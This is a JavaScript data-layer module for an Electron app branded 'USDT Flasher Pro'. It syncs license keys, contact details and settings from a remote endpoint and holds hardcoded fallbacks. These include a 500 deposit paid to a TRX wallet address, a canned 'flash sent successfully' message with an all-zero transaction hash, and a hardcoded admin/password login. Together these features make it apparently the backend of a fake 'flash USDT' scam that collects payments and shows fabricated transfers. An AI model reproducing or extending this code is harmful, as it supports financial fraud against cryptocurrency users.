const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { app } = require('electron');

// Cache data
let licenseKeysCache = [];
let contactInfoCache = null;
let appSettingsCache = null;
let lastFetchTime = {
  licenseKeys: 0,
  contactInfo: 0,
  appSettings: 0
};

// Cache expiration time (in milliseconds)
const CACHE_EXPIRATION = 5 * 60 * 1000; // 5 minutes

// API base URL
const API_BASE_URL = 'https://usdtflasherpro.netlify.app/.netlify/functions';

// Fallback data (used when API is unavailable)
const fallbackLicenseKeys = [
  {
    id: 1,
    key: 'USDT-ABCD-1234-EFGH-5678',
    status: 'active',
    created_at: '2025-01-15T10:30:00.000Z',
    expires_at: '2026-01-15T10:30:00.000Z',
    user: 'test@gmail.com',
    type: 'demo',
    maxAmount: 30
  },
  {
    id: 2,
    key: 'USDT-IJKL-9012-MNOP-3456',
    status: 'active',
    created_at: '2025-02-20T14:45:00.000Z',
    expires_at: '2026-02-20T14:45:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  },
  {
    id: 3,
    key: 'YGMI-7B5L-GVUF-SL1Q',
    status: 'active',
    created_at: '2025-03-05T10:00:00.000Z',
    expires_at: '2026-03-05T10:00:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  }
];

const fallbackContactInfo = {
  primaryPhone: '+447013216​28',
  secondaryPhone: '+14693510740',
  tertiaryPhone: '+91 7823232332',
  email: 'support@usdtflasherpro.com',
  website: 'https://usdtflasherpro.com',
  telegramUsername: '@usdtflasherpro',
  discordServer: 'discord.gg/usdtflasherpro'
};

const fallbackAppSettings = {
  appVersion: '4.8',
  updateChannel: 'stable',
  autoUpdate: true,
  theme: 'dark',
  accentColor: '#00e6b8',
  animationsEnabled: true,
  sessionTimeout: 30,
  requirePasswordOnStartup: true,
  twoFactorAuth: false,
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0,
  debugMode: false,
  logLevel: 'info',
  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
  // Payment settings
  depositAmount: 500,
  transactionFee: 'Transaction Fee',
  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  // Success modal settings
  successTitle: 'Success',
  successMessage: 'The flash has been sent successfully',
  transactionHash: '000000000000000000000000000000000000'
};

// Get user data directory
const getUserDataPath = () => {
  const userDataPath = app ? app.getPath('userData') : path.join(__dirname, 'data');
  
  // Create directory if it doesn't exist
  if (!fs.existsSync(userDataPath)) {
    fs.mkdirSync(userDataPath, { recursive: true });
  }
  
  return userDataPath;
};

// Cache file paths
const getCacheFilePath = (type) => {
  const userDataPath = getUserDataPath();
  return path.join(userDataPath, `${type}-cache.json`);
};

// Load cache from disk
const loadCacheFromDisk = (type) => {
  try {
    const filePath = getCacheFilePath(type);
    
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error(`Error loading ${type} cache from disk:`, error);
  }
  
  return null;
};

// Save cache to disk
const saveCacheToDisk = (type, data) => {
  try {
    const filePath = getCacheFilePath(type);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (error) {
    console.error(`Error saving ${type} cache to disk:`, error);
  }
};

// Initialize cache from disk
const initializeCache = () => {
  // Load license keys cache
  const licenseKeysFromDisk = loadCacheFromDisk('licenseKeys');
  if (licenseKeysFromDisk) {
    licenseKeysCache = licenseKeysFromDisk;
  }
  
  // Load contact info cache
  const contactInfoFromDisk = loadCacheFromDisk('contactInfo');
  if (contactInfoFromDisk) {
    contactInfoCache = contactInfoFromDisk;
  }
  
  // Load app settings cache
  const appSettingsFromDisk = loadCacheFromDisk('appSettings');
  if (appSettingsFromDisk) {
    appSettingsCache = appSettingsFromDisk;
  }
};

// Initialize cache
initializeCache();

// Create axios instance with the correct base URL
const apiClient = axios.create({
  baseURL: API_BASE_URL,
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer dummy-token' // Add a dummy token for now
  }
});

// API interface
const api = {
  // Fetch license keys from API
  fetchLicenseKeys: async () => {
    try {
      console.log(`Fetching license keys from: ${API_BASE_URL}/license-keys`);
      const response = await apiClient.get('/license-keys');
      const licenseKeys = response.data;
      
      // Update cache
      licenseKeysCache = licenseKeys;
      lastFetchTime.licenseKeys = Date.now();
      
      // Save to disk
      saveCacheToDisk('licenseKeys', licenseKeys);
      
      return licenseKeys;
    } catch (error) {
      console.error('Error fetching license keys from API:', error);
      
      // Return cache if available, otherwise fallback
      return licenseKeysCache.length > 0 ? licenseKeysCache : fallbackLicenseKeys;
    }
  },
  
  // Fetch contact info from API
  fetchContactInfo: async () => {
    try {
      console.log(`Fetching contact info from: ${API_BASE_URL}/contact-info`);
      const response = await apiClient.get('/contact-info');
      const contactInfo = response.data;
      
      // Update cache
      contactInfoCache = contactInfo;
      lastFetchTime.contactInfo = Date.now();
      
      // Save to disk
      saveCacheToDisk('contactInfo', contactInfo);
      
      return contactInfo;
    } catch (error) {
      console.error('Error fetching contact info from API:', error);
      
      // Return cache if available, otherwise fallback
      return contactInfoCache || fallbackContactInfo;
    }
  },
  
  // Fetch app settings from API
  fetchAppSettings: async () => {
    try {
      console.log(`Fetching app settings from: ${API_BASE_URL}/app-settings`);
      const response = await apiClient.get('/app-settings');
      const appSettings = response.data;
      
      // Update cache
      appSettingsCache = appSettings;
      lastFetchTime.appSettings = Date.now();
      
      // Save to disk
      saveCacheToDisk('appSettings', appSettings);
      
      return appSettings;
    } catch (error) {
      console.error('Error fetching app settings from API:', error);
      
      // Return cache if available, otherwise fallback
      return appSettingsCache || fallbackAppSettings;
    }
  }
};

// Start periodic sync
const startPeriodicSync = () => {
  // Sync every 5 minutes
  setInterval(async () => {
    try {
      await api.fetchLicenseKeys();
      await api.fetchContactInfo();
      await api.fetchAppSettings();
      console.log('Periodic sync completed at', new Date().toISOString());
    } catch (error) {
      console.error('Error during periodic sync:', error);
    }
  }, CACHE_EXPIRATION);
};

// Start periodic sync
startPeriodicSync();

// Database interface
const db = {
  getLicenseKeys: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.licenseKeys > CACHE_EXPIRATION) {
      return await api.fetchLicenseKeys();
    }
    
    // Return cache if available, otherwise fetch from API
    return licenseKeysCache.length > 0 ? licenseKeysCache : await api.fetchLicenseKeys();
  },
  
  getLicenseKey: async (id) => {
    const licenseKeys = await db.getLicenseKeys();
    return licenseKeys.find(k => k.id === id) || null;
  },
  
  getContactInfo: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.contactInfo > CACHE_EXPIRATION) {
      return await api.fetchContactInfo();
    }
    
    // Return cache if available, otherwise fetch from API
    return contactInfoCache || await api.fetchContactInfo();
  },
  
  getAppSettings: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.appSettings > CACHE_EXPIRATION) {
      return await api.fetchAppSettings();
    }
    
    // Return cache if available, otherwise fetch from API
    return appSettingsCache || await api.fetchAppSettings();
  },
  
  getFlashHistory: () => [],
  
  authenticateUser: (email, password) => {
    if (email === 'admin@example.com' && password === 'password') {
      return {
        success: true,
        user: {
          id: 1,
          email: 'admin@example.com',
          displayName: 'Admin User',
          role: 'admin'
        }
      };
    }
    return { success: false, message: 'Invalid email or password' };
  }
};

// License Key functions
async function validateLicenseKey(key) {
  try {
    // Get all license keys from the database
    const licenseKeys = await db.getLicenseKeys();
    
    // Find the license key
    const licenseKey = licenseKeys.find(license => license.key === key);
    
    if (!licenseKey) {
      return { valid: false, message: 'Invalid license key' };
    }
    
    // Check if license key is active
    if (licenseKey.status !== 'active') {
      return { valid: false, message: `License key is ${licenseKey.status}` };
    }
    
    // Check if license key has expired
    const expiryDate = new Date(licenseKey.expires_at || licenseKey.expiresAt);
    if (expiryDate < new Date()) {
      return { valid: false, message: 'License key has expired' };
    }
    
    // Get app settings for max flash amounts
    const appSettings = await db.getAppSettings();
    
    // Determine license type and user
    const isDemo = licenseKey.type === 'demo' || key === 'USDT-ABCD-1234-EFGH-5678';
    const user = isDemo ? 'test@gmail.com' : 'live@gmail.com';
    const type = isDemo ? 'demo' : 'live';
    const maxAmount = isDemo ? appSettings.demoMaxFlashAmount : appSettings.liveMaxFlashAmount;
    
    // Add license type and user to the response
    licenseKey.type = type;
    licenseKey.user = user;
    licenseKey.maxAmount = maxAmount;
    
    return { valid: true, licenseKey };
  } catch (error) {
    console.error('Error validating license key:', error);
    return { valid: false, message: 'Error validating license key. Please try again.' };
  }
}

// Contact Information functions
async function getContactInfo() {
  try {
    return await db.getContactInfo();
  } catch (error) {
    console.error('Error getting contact info:', error);
    throw error;
  }
}

function updateContactInfo(contactData) {
  try {
    // This is not implemented for the desktop app
    return contactData;
  } catch (error) {
    console.error('Error updating contact info:', error);
    throw error;
  }
}

function getContactInfoHistory(limit = 10) {
  try {
    // This is not implemented for the desktop app
    return [];
  } catch (error) {
    console.error('Error getting contact info history:', error);
    return [];
  }
}

// App Settings functions
async function getAppSettings() {
  try {
    return await db.getAppSettings();
  } catch (error) {
    console.error('Error getting app settings:', error);
    throw error;
  }
}

function updateAppSettings(settingsData) {
  try {
    // This is not implemented for the desktop app
    return settingsData;
  } catch (error) {
    console.error('Error updating app settings:', error);
    throw error;
  }
}

// Flash Transaction functions
function logFlashTransaction(transactionData) {
  try {
    // For now, we'll just return a success response
    return { success: true, id: Date.now() };
  } catch (error) {
    console.error('Error logging flash transaction:', error);
    return { success: false, error: error.message };
  }
}

function getFlashHistory(licenseKeyId) {
  try {
    return [];
  } catch (error) {
    console.error('Error getting flash history:', error);
    return [];
  }
}

// User Authentication functions
function authenticateUser(email, password) {
  try {
    return db.authenticateUser(email, password);
  } catch (error) {
    console.error('Error authenticating user:', error);
    return { success: false, message: 'Authentication error' };
  }
}

// Force refresh data from API
async function forceRefresh() {
  try {
    await api.fetchLicenseKeys();
    await api.fetchContactInfo();
    await api.fetchAppSettings();
    return { success: true, message: 'Data refreshed successfully' };
  } catch (error) {
    console.error('Error refreshing data:', error);
    return { success: false, message: 'Error refreshing data' };
  }
}

// Export functions
module.exports = {
  validateLicenseKey,
  getLicenseKeys: async () => await db.getLicenseKeys(),
  getLicenseKey: async (id) => await db.getLicenseKey(id),
  getContactInfo,
  updateContactInfo,
  getContactInfoHistory,
  getAppSettings,
  updateAppSettings,
  logFlashTransaction,
  getFlashHistory,
  authenticateUser,
  forceRefresh
};
